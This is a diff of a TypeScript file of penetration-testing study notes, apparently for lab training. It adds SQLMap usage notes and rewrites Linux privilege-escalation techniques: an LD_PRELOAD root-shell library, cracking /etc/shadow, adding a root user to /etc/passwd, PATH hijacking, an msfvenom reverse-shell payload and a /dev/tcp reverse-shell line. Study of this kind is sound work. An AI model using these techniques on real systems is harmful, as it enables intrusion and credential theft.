@@ -55,13 +55,6 @@ export const noteTree: NoteNode[] = [
       {
         slug: "enumeration",
         title: "Enumeration",
-        body: `Nmap scans
-
-Web enum: finding subdomains, directories and files on webserver
-
-Active directory enumeration
-
-Application enumeration`,
         children: [
           {
             slug: "nmap",
@@ -259,9 +252,6 @@ Removes noise strings, only: that start with an alphanumeric character, then all
           {
             slug: "tools",
             title: "Tools",
-            body: `Gobuster  
-ffuf  
-cURL`,
             children: [
               {
                 slug: "gobuster",
@@ -412,8 +402,6 @@ Note: In WINDOWS: only double quotes must be used and quotes inside data must be
           {
             slug: "web-enumeration",
             title: "Web Enumeration",
-            body: `Passive Enumeration  
-Active Enumeration`,
             children: [
               {
                 slug: "passive",
@@ -665,16 +653,10 @@ Tool: nfs-common`,
       {
         slug: "exploitation",
         title: "Exploitation",
-        body: `Web exploitation  
-Application exploitation  
-Shells  
-Password cracking  
-Metasploit`,
         children: [
           {
             slug: "web-exploitation",
             title: "Web Exploitation",
-            body: `All web vulnerabilities`,
             children: [
               {
                 slug: "authentication-bypass",
@@ -872,6 +854,101 @@ NOTE: all the placeholders/columns must be satisfied. for columns use open and c
                   {
                     slug: "sqlmap",
                     title: "SQLMap",
+                    body: `## General Options
+
+| Flag | Description |  
+| --- | --- |  
+| -h | Basic help |  
+| -hh | Full help: all options and switches |  
+| -u | URL |  
+| --batch | To skip any req. user input, choose default option |  
+| --dump | Dump all data |  
+| --parse-errors | Displays DBMS errors if any |  
+| -t [file_name] | Stores whole traffic content to a file |  
+| --proxy [url] | Redirect traffic through a proxy, eg: burp |
+
+## Set up SQLMap request against target
+
+### cURL Command
+
+• Use <span class="cmd">Copy as cURL</span> feature from within the Network panel inside the developer tools of browser
+
+![Screenshot 1 in SQLMap notes](/notes/sqlmap/img1.png)
+
+• Paste it in terminal and replace <span class="cmd">curl</span> with <span class="cmd">sqlmap</span>
+
+### POST Request
+
+<span class="cmd">--data</span> flag can be used: Data in quotes  
+<span class="cmd">sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'</span>  
+<span class="cmd">uid</span> and <span class="cmd">name</span> will be tested for SQLi vulnerability  
+We can narrow the tests to a specific parameter using <span class="cmd">*</span> or <span class="cmd">-p [param]</span>  
+<span class="cmd">sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'</span>  
+<span class="cmd">sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test' -p uid</span>
+
+### Full HTTP Request
+
+<span class="cmd">-r</span> flag can be used: request file captured from burp  
+Copy the request content from burp. Paste it into a file and:  
+<span class="cmd">sqlmap -r req.txt</span>
+
+### Custom Request
+
+| Flag | Description |  
+| --- | --- |  
+| -H or --header | Set header values: -H='Cookie:PHPSESSID=some_value' |  
+| --cookie | Set cookie: --cookie='PHPSESSID=some_value' |  
+| --random-agent | Randomly selects User-Agent header from regular browser values |  
+| --mobile | Imitate smartphone by using same header value |  
+| --user-agent or -A |  |  
+| --host |  |  
+| --referer |  |
+
+## Attack Tuning
+
+### Prefix/Suffix
+
+Options <span class="cmd">--prefix</span> and <span class="cmd">--suffix</span> can be used if there is a requirement of special prefix or suffix values  
+<span class="cmd">sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"</span>  
+All vector values will be enclosed between the static prefix <span class="cmd">%'))</span> and the suffix <span class="cmd">-- -</span>  
+Eg: If the vulnerable code at the target is:  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";</span>  
+<span class="cmd">	$result = mysqli_query($link, $query);</span>  
+&nbsp;&nbsp;&nbsp;&nbsp;The vector <span class="cmd">UNION ALL SELECT 1,2,VERSION()</span>, bounded with the prefix <span class="cmd">%'))</span> and the suffix <span class="cmd">-- -</span>, will result in the following (valid) SQL statement at the target:  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1</span>
+
+### Level/Risk
+
+SQLMap combines predefined set of common **boundaries** (prefix/suffix pairs), along with **vectors** having a high chance of success with a vulnerable target.  
+There is a possibility for users to use bigger sets of boundaries and vectors, so: options <span class="cmd">--level </span>and <span class="cmd">--risk</span> should be used:  
+<span class="cmd">--level</span> (1-5, default 1) extends **both vectors and boundaries** being used, based on **expectancy of success** (higher level, if expectancy of success is low).  
+<span class="cmd">--risk</span> (1-3, default 1) extends the **used vector** set based on their **risk of causing problems** at the target side (i.e., risk of database entry loss or denial-of-service).  
+NOTE: Use verbosity level of 3 or higher : Since, messages containing the used [PAYLOAD] will be displayed  
+Info: As for the number of payloads, by default (i.e. --level=1 --risk=1), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (--level=5 --risk=3) the number of payloads increases to 7,865.
+
+### Advanced Tuning
+
+**Status Codes**  
+<span class="cmd">--code [number]</span> : TRUE response detection to a specific HTTP status code.
+
+**Strings**  
+<span class="cmd">--string=[string_to_check]</span> : Fixed string appears only in TRUE responses
+
+**Text-only**  
+<span class="cmd">--text-only</span> : Useful when hidden tags (<span class="cmd">&lt;script&gt;</span>,<span class="cmd"> &lt;style&gt;</span>, <span class="cmd">&lt;meta&gt;</span>, etc.) interfere with comparison
+
+**Techniques**  
+<span class="cmd">--technique=[techniques_to_be_used]</span> : Restrict SQLMap to specific SQLi techniques. Useful to skip problematic techniques.  
+<span class="cmd">--technique=BEU</span> : Tests only Boolean-based blind, Error-based, and UNION-query, skips time-based blind and stacked queries  
+<span class="cmd">B</span>=Boolean-blind, <span class="cmd">E</span>=Error-based, <span class="cmd">U</span>=UNION-query, <span class="cmd">S</span>=Stacked queries, <span class="cmd">T</span>=Time-based blind (standard SQLMap notation)
+
+**UNION SQLi Tuning**
+
+| Flag | Description |  
+| --- | --- |  
+| --union-cols=[num] | Specify number of columns for UNION query |  
+| --union-char=['a'] | Set custom "dummy" fill value (replaces default NULL/random int) |  
+| --union-from=[table] | Set FROM table appendix required by some DBMS (e.g. Oracle) |`,
                   },
                 ],
               },
@@ -1601,7 +1678,7 @@ Tip: Run <span class="cmd">ifconfig</span> command directly to find out local IP
 ## Encoding Payloads
 
 Famous encoding: Shikata Na Gai  
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\\\\x00" -f perl -e x86/shikata_ga_nai
+<span class="cmd">msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\\\\x00" -f perl -e x86/shikata_ga_nai</span>
 
 ### Show available encoders for an exploit
 
@@ -2176,8 +2253,6 @@ Verify if file is present:
       {
         slug: "privilege-escalation",
         title: "Privilege Escalation",
-        body: `Linux Privilege Escalation  
-Windows Privilege Escalation`,
         children: [
           {
             slug: "linux-privilege-escalation",
@@ -2190,70 +2265,110 @@ Windows Privilege Escalation`,
 [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)  
 • Linpill: [https://academy.hackthebox.com/app/module/296/section/3399](https://academy.hackthebox.com/app/module/296/section/3399) resources section. Pillaging script : overview of what exists on the system.
 
-### Enumeration
+## Enumeration
 
-uname -a : Additional detail about the kernel.  
-uname -r : Print the version of linux.  
-/proc/version : Info on system processes. Checks if GCC is there or not  
-sudo -l : list all commands a user can run using **sudo**  
-/etc/passwd : Shows the users in the system and needed for password cracking  
-Useful **find** commands:  
-&nbsp;find / -type f -perm 0777\`: find files with the 777 permissions (files readable, writable, and executable by all users) find / -perm a=x\`: find executable files  
-find /home -user frank\`: find all files for user “frank” under “/home”  
-Use the “find” command with [2&gt;/dev/null] to redirect errors to “/dev/null” and have a cleaner output.  
-Folders and files that can be written to or executed from:  
-find / -writable -type d 2&gt;/dev/null\` : Find world-writeable folders find / -perm -222 -type d 2>/dev/null\`: Find world-writeable folders  
-&nbsp;find / -perm -o w -type d 2&gt;/dev/null\`: Find world-writeable folders  
-&nbsp;find / -perm -o x -type d 2&gt;/dev/null : Find world-executable folders
+### OS Enumeration
 
-#### **IMP**
+<span class="cmd">uname -a</span> : Additional detail about the kernel.  
+<span class="cmd">uname -r</span> : Print the version of linux.  
+<span class="cmd">cat /proc/version</span> : Info on system processes. Check if GCC is there or not  
+<span class="cmd">cat /etc/issue</span> : Info about the OS  
+<span class="cmd">dpkg -l</span> : Installed packages in system  
+<span class="cmd">ps aux</span>   
+<span class="cmd">ps axjf</span>  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">-a</span> : From all users  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">-u</span> : User that launched the process  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">-x</span> : Processes not attached to terminal  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">-j</span> : Jobs format output  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">-f</span> : Forest/tree view
 
-find / -perm -u=s -type f 2&gt;/dev/null : Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
+### User Enumeration
 
-### Privilege Escalation: Kernel Exploits
+<span class="cmd">id</span> : Overview of user's privilege level and group memeberships  
+<span class="cmd">sudo -l</span> : list all commands a user can run using **sudo**  
+<span class="cmd">cat /etc/passwd | grep home</span> : Shows the users that have home folder.
 
-Be very specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit.  
-&nbsp;Some exploit codes can make irreversible changes to the system.  
-&nbsp;To transfer the exploit code: Use SimpleHTTPServer Python module (Runs on port 8000) and wget.  
-\`python3 -m http.server\`
+### File Enumeration
 
-### Privilege Escalation: Sudo
+<span class="cmd">find / -type f -perm 0777</span> : Files with the 777 permissions (files readable, writable, and executable by all users)   
+<span class="cmd">find / -perm a=x</span> : Executable files  
+Writeable folders:  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">find / -writable -type d 2&gt;/dev/null</span>  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">find / -perm -o w -type d 2&gt;/dev/null</span>  
+Executable folders	  
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmd">find / -perm -o x -type d 2&gt;/dev/null</span>  
+**Files with SUID bit set**  
+<span class="cmd">find / -perm -u=s -type f -ls 2&gt;/dev/null</span>
 
-To check programs that can be run as root user:  
-\`sudo -l\`  
-**MOST IMPORTANT**:  [https://gtfobins.github.io/](https://gtfobins.github.io/) : how a program that has sudo or suid rights, can be used to get root shell.
+## Kernel Exploits
 
-**LD_PRELOAD**:  
-&nbsp;"env_keep" option must be enabled.  
-&nbsp;shell.c  
-\`#include <stdio.h>  \`  
-\`#include <sys/types.h>  \`  
-\`#include <stdlib.h>  \`  
-\`void _init() {  \`  
-\`	unsetenv("LD_PRELOAD");  \`  
-\`	setgid(0);  \`  
-\`	setuid(0);  \`  
-\`	system("/bin/bash");  \`  
-\`}  \`  
-\`gcc -fPIC -shared -o shell.so shell.c -nostartfiles\`  
-Use this with any program that can be run as sudo.  
-\`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find\`  
-\`# find can be replaced with any program that has sudo access\`
+Be very specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit. Some exploit codes can make irreversible changes to the system.  
+To transfer the exploit code: Use SimpleHTTPServer Python module and wget.  
+<span class="cmd">python3 -m http.server</span>
 
-### Privilege Escalation: SUID
+## Sudo
 
-List files that have SUID or SGID bits set:  
-\`find / -type f -perm -04000 -ls 2>/dev/null \`  
-Use GTFOBins to see if any program can be exploited with SUID.  
-Base64, vim, nano can be used to read root files: /etc/shadow and /etc/passwd  
-&nbsp;With these, we can crack the password using john:  
-\`unshadow passwd.txt shadow.txt > unshadowed.txt\`  
-\`john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt\`
+• To check programs that can be run as root user:  
+<span class="cmd">sudo -l</span>  
+GTFOBins : [https://gtfobins.github.io/](https://gtfobins.github.io/) : how a program that has sudo or suid rights, can be used to get root shell.
 
-### Privilege Escalation: Capabilities
+LD_PRELOAD:  
+•  "<span class="cmd">env_keep</span>" option must be enabled.
+
+<span class="cmd">#include &lt;stdio.h&gt;  </span>  
+<span class="cmd">#include &lt;sys/types.h&gt;  </span>  
+<span class="cmd">#include &lt;stdlib.h&gt;  </span>  
+<span class="cmd">void _init() {  </span>  
+<span class="cmd">	unsetenv("LD_PRELOAD");  </span>  
+<span class="cmd">	setgid(0);  </span>  
+<span class="cmd">	setuid(0);  </span>  
+<span class="cmd">	system("/bin/bash");  </span>  
+<span class="cmd">} </span>
+
+<span class="cmd">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span>  
+• Use this with any program that can be run as sudo.  
+<span class="cmd">sudo LD_PRELOAD=/home/[user]/ldpreload/shell.so [command]</span>
+
+## SUID
+
+• List files that have SUID or SGID bits set:  
+<span class="cmd">find / -type f -perm -04000 -ls 2&gt;/dev/null </span>  
+• Use GTFOBins to see if any program can be exploited with SUID.  
+• Base64, vim, nano can be used to read root files: <span class="cmd">/etc/shadow</span> and <span class="cmd">/etc/passwd</span>  
+2 approaches: Crack <span class="cmd">/etc/shadow</span> or add user in <span class="cmd">/etc/passwd</span>  
+• With these, we can crack the password using john:  
+<span class="cmd">unshadow passwd.txt shadow.txt &gt; unshadowed.txt</span>  
+<span class="cmd">john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt</span>  
+• Replace the root user  
+• Hash the password value of new user  
+<span class="cmd">openssl passwd -1 -salt THM password1</span>  
+• Add this password with username to <span class="cmd">/etc/passwd</span> using the program that has SUID bit set.  
+<span class="cmd">[username]:[password_hash]:0:0:/root:/bin/bash</span>  
+Eg: <span class="cmd">bob:$1$THM$S9Z0Kn20KzerqwdU.hF40/:0:0:/root:/bin/bash</span>  
+su [username]  
+• Enter the password
+
+## PATH
+
+• We must have an SUID binary already with root privileges (custom binary). Extract the strings of it  
+<span class="cmd">strings [binary]</span>  
+If there is a command that it runs without absolute path eg: whoami or ls etc., we can hijack it the $PATH env variable.  
+• This command should be noted down.  
+• First find writable folders:  
+<span class="cmd">find / -writable 2&gt;/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u</span>  
+Easiest folder to write to: /tmp  
+• Export it to the PATH if it is not  
+<span class="cmd">export PATH=/tmp:$PATH</span>  
+• Create an executable script in the writable folder:  
+<span class="cmd">echo "/bin/bash" &gt; [command_found_above]</span>  
+<span class="cmd">chmod 777 [command_found_above]</span>  
+• Finally, run the SUID binary from the beginning to obtain the shell:  
+<span class="cmd">./[binary]</span>
+
+## Capabilities
 
 To list capabilities:  
-\`getcap -r / 2>/dev/null\`  
+<span class="cmd">getcap -r / 2&gt;/dev/null</span>  
 Use GTFOBins to exploit it.
 
 ### Privilege Escalation: Cron Jobs
@@ -2263,27 +2378,6 @@ To list the cron jobs:
 Modify the script to send a reverse shell back:  
 \`#!/bin/bash\`  
 \`bash -i >& /dev/tcp/[attacker_ip]/[PORT] 0>&1\`
-
-### Privilege Escalation: PATH
-
-First find writable folders:  
-\`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u\`  
-Easiest folder to write to: /tmp  
-&nbsp;Export it to the PATH if it is not  
-\`export PATH=/tmp:$PATH\`  
-Create an executable script in the writable folder:  
-\`echo "/bin/bash" > thm\`  
-\`chmod 777 thm\`  
-Then create a script where you can set the SUID bit:  
-&nbsp;"thm" should be the same name as the name as above file:  
-\`#include<unistd.h>\`  
-\`void main(){\`  
-\`	setuid(0);\`  
-\`	setgid(0);\`  
-\`	system("thm");\`  
-\`}\`  
-Run the executable to obtain the shell:  
-\`./thm\`
 
 ### Privilege Escalation: NFS
 
